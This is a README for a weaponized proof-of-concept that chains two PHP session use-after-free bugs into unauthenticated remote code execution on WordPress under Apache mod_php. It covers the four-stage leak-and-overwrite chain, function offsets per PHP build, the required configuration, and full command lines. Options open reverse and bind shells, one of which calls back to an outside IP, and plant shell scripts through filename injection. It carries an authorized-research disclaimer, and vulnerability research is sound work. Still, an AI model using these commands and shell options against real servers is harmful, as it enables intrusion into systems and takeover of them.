# PHP2Shell — WordPress Pre-Auth RCE (CVE-2026-109618 / CVE-2026-109619)

A weaponized proof-of-concept that chains the two PHP2Shell memory-corruption
flaws into **unauthenticated remote code execution** against **WordPress** on a
vulnerable **Apache mod_php (prefork)** deployment — self-calibrating and
operational with **ASLR left on**.

> [!WARNING]
> **Authorized security research and education only.**
> This code exploits a *patched* critical vulnerability. Run it only against
> systems you own or have written permission to test; the author accepts no
> liability for misuse.
---

## Overview

| | |
|---|---|
| **CVE** | [CVE-2026-109618](https://nvd.nist.gov/vuln/detail/CVE-2026-109618), [CVE-2026-109619](https://nvd.nist.gov/vuln/detail/CVE-2026-109619) |
| **Severity** | CVSS v4.0 **9.2 (Critical)** each |
| **Class** | Use-after-free / stale-pointer (CWE-416) in `ext/session/session.c` |
| **Root cause** | `longjmp()`/bailout on OOM and fatal errors leaves session state pointing at freed memory |
| **Affected** | PHP **5.4.0 → 8.5.11** |
| **Fixed in** | **8.2.35**, **8.3.36**, **8.4.27**, **8.5.12** (2026-10-21) |
| **Primary target** | **WordPress 7.1.2 / 7.1.3** on vulnerable `php:8.4.26-apache` |

## WordPress in scope

The exploit is validated primarily against **WordPress 7.1.2 and 7.1.3**:

- The **WordPress application files** come from the official
  `wordpress:<ver>-php8.4-apache` images — which themselves ship *fixed* PHP
  8.4.27 — and are re-hosted on a **vulnerable `php:8.4.26-apache`** base image.
- The lab uses the **SQLite drop-in** (no MySQL) and enables **mod_rewrite**
  (WordPress `.htaccess` requires it).
- The bug fires during **PHP request startup**, before WordPress bootstraps, so
  the CMS version is incidental: `/`, `/index.php`, and `/wp-login.php` are all
  equally valid trigger points. A bare `<?php echo "OK"; ?>` page in the same
  webroot is attacked exactly the same way.

### ASLR-on determinism

WordPress runs **with ASLR enabled** and the leak stages stay deterministic by
targeting a **plain PHP entry URL** (`/oomba_test.php`) instead of a WordPress
bootstrap page:

> The WP bootstrap perturbs the request-B heap layout — the leak failed
> **9+ consecutive runs** on `/`, versus first-attempt on the plain entry. This
> reproduces the earlier 7.1.3 path-dependence observation; future tests keep
> ASLR on.

### PHP 7.4 caveat

A WordPress 7.1.3 build on **PHP 7.4.33** strands (the producer fires) but the
stage-1 leak never lands — `php_session_initialize` rejects the stale id
(`"session id is too long or contains illegal characters"`) before the
`reset_id` cookie path can url-encode it. The chain is therefore effective on
PHP 8.2–8.5, not "everything back to 5.4".

## Vulnerability background

PHP parses RFC 1867 multipart bodies during request startup. The
`session.upload_progress` callback (`php_session_rfc1867_callback()` in
`ext/session/session.c`) keeps raw `zval*` pointers in the session `HashTable`
to track upload progress. If an upload stalls beyond
`session.upload_progress.min_freq` (default 1s), a later `FILE_DATA` event
re-runs session init, which frees that `HashTable` while the cached pointers
remain — a use-after-free.

- **CVE-2026-109618** — an out-of-memory (`memory_limit`) hit bails out via
  `longjmp()` and strands half-initialized state; mod_php then runs
  `php_request_shutdown()` unconditionally and walks it.
- **CVE-2026-109619** — request-owned globals (`PS`/`EG`) outlive a bailout and
  are dereferenced by the *next* request handled by the same worker.

618 produces the strand; 619 consumes it via the stale `ps_globals` walk.

## Exploit chain

```
stage 0   rotate worker over HTTP       -> prefork forks a fresh child (shared ASLR layout)
stage 1   Set-Cookie heap leak          -> Zend MM chunk base
stage 2   Set-Cookie libphp leak        -> libphp base (zval_ptr_dtor)
[chain]   plant /tmp/sess_b             -> arbitrary-length shell script
stage 3   fake-ref over http_session_vars -> pDestructor = zif_system => system(cmd)
```

1. **ASLR is defeated by leaks, not guessing** — prefork children share one
   address-space layout, so a pointer leaked by one request stays valid for the
   next.
2. **Stage 1** recovers the Zend MM chunk base from `Set-Cookie`; the filler
   count is *derived* from the near-miss leak (`v<NNNN>xxxx…`).
3. **Stage 2** recovers `libphp.so` via a `zval_ptr_dtor` pointer in the
   cookie, self-checking the offsets DB entry.
4. **Stage 3** overwrites `PS(http_session_vars)` with a forged
   `zend_reference`, then drops a fake `HashTable` whose `pDestructor` is
   `zif_system` — session teardown invokes `system(command)`.

## Requirements

### PHP configuration (`files/php.ini`)

```ini
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M
session.save_path = /tmp
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

Apache must be **prefork** with a **single worker** (`files/single.conf`), so
the producer and consumer requests land on the same child.

### Offsets (auto-detected)

The `X-Powered-By` version picks a DB entry, which stage 2 then **self-validates**
against the leaked `zval_ptr_dtor` page-offset:

| PHP version | `zif_system` | `zval_ptr_dtor` |
|---|---|---|
| 8.4.26 | `0x465370` | `0x65EB60` |
| 8.2.34 | `0x39B8A0` | `0x487650` |
| 7.4.33 | `0x335850` | `0x417D60` (stage-1 leak gated) |

`htdata` carrier offset: `0x690D8` (bookworm) / `0x6E0D8` (lab). Override via
`--zif-offset` / `--dtor-offset` / `--htdata-offset`.

## Quick start

```bash
# Start the lab (extracts WordPress webroots, plants /oomba_test.php, 4 targets)
./docker_lab.sh

# WordPress 7.1.2 through the plain entry URL — zero config:
python3 exploit.py -u http://127.0.0.1:8092/oomba_test.php \
  --script '{ echo ===WP712_RCE; id; cat /var/www/html/wp-includes/version.php | grep wp_version; } >/out/pW' \
  --proof-file ../out/pW

# Plain PHP target — zero config:
python3 exploit.py -u http://127.0.0.1:8088/index.php \
  -c 'id>/out/p1' --proof-file ../out/p1
```

Expected output:

```
PROOF: ===WP712_RCE
uid=33(www-data) gid=33(www-data) groups=33(www-data)
 * @global string $wp_version
$wp_version = '7.1.2';
```

## Usage

```
python3 exploit.py -u URL [options]
```

| Option | Default | Description |
|---|---|---|
| `-u, --url` | *(required)* | Target PHP page, e.g. `http://127.0.0.1:8092/oomba_test.php` |
| `-c, --cmd` | *(auto)* | Command (`<= 14` bytes direct; longer auto-chained) |
| `--script` | `""` | sh one-liner for the session-file chain (any length; no raw `"`) |
| `--interactive-bind PORT` | off | Listen on the target at PORT after exploitation, then connect |
| `--interactive-reverse IP:PORT` | off | Call back to IP:PORT after exploitation (reachable from target) |
| `--proof-file` | `""` | Local file to read after exploitation (shared mount) |
| `--fetch` | `""` | `GET` this path afterward (for commands writing to the webroot) |
| `--zif-offset` / `--dtor-offset` | auto | Pin offsets (skip the DB) |
| `--profile` | `bookworm` | `bookworm` (official image) or `lab` (Apache 2.4.68) |
| `--htdata-offset` | auto | Chunk-relative offset of the 167-byte carrier string |
| `--huge-mb` | `12` | OOM field size; auto-raised above the probed `memory_limit` |
| `--filter-count N` | auto | Pin the stage-1 filler count (skip derivation/sweep) |
| `--retries` | `3` | Leak-stage attempts (stage 3 uses `retries+2`) |
| `--leak-only` | off | Run stages 1+2, print addresses, stop before stage 3 |
| `--probe-memory-limit` | off | Run only the memory-limit/post-max probe and exit |
| `--no-autotune` | off | Disable fingerprint + probe + filler derivation |
| `--no-pre-rotate` | off | Skip the initial worker rotation |
| `--no-retry-rotate` | off | Don't rotate between failed attempts |
| `--timeout` | `30.0` | Per-request timeout (seconds) |
| `-v, --verbose` | off | Debug tier (pointer histograms, dtor offsets, payload internals) |
| `-q, --quiet` | off | Suppress progress output |

### Command delivery

1. **`--cmd` (≤ 14 bytes)** — embedded in the 167-byte fake-`zend_string`
   carrier (e.g. `id>/out/p1`).
2. **`--script` / long `--cmd`** — planted into `/tmp/sess_b` through
   `upload_progress` filename injection plus a mid-upload RST, then run as
   `sh</tmp/sess_b` (exactly 14 bytes). No practical length limit.
3. **`--interactive-bind` / `--interactive-reverse`** — a line-mode interactive
   shell (base64-packed PHP socket shell delivered via the session chain).

### Triage

```bash
# Leak only — confirm the target leaks without firing stage 3:
python3 exploit.py -u http://127.0.0.1:8092/oomba_test.php --leak-only

# Probe only — derive memory_limit / post_max_size, no exploitation:
python3 exploit.py -u http://127.0.0.1:8092/oomba_test.php --probe-memory-limit
```

### Interactive shell

```bash
# reverse: the target calls back to the docker bridge IP
python3 exploit.py -u http://127.0.0.1:8092/oomba_test.php --interactive-reverse 172.17.0.1:4500

# bind: the payload listens on the target; exploit.py connects to the published port
python3 exploit.py -u http://127.0.0.1:8092/oomba_test.php --interactive-bind 4501
```

## Limitations

- **Build-pinned offsets** — `zif_system` / `zval_ptr_dtor` are per-`libphp.so`
  build; the DB covers 8.4.26, 8.2.34, and 7.4.33. Anything else needs manual
  measurement and `--zif-offset` / `--dtor-offset`.
- **PHP 7.4.33 is leak-gated** — the chain is effectively 8.2–8.5.
- **Strict config** — `display_errors=1`, a small `memory_limit`,
  single-worker prefork, and `save_path=/tmp` (the 14-byte `sh</tmp/sess_b`
  carrier does not fit distro `/var/lib/php/sessions`).
- **`NOT_STRANDABLE` targets** — if `memory_limit` ≥ `post_max_size`, no single
  upload can OOM the target, so the strand can never be produced.
- **Already patched** — targets 8.4.26 / 8.2.34 / 7.4.33; inert against the
  fixed releases.
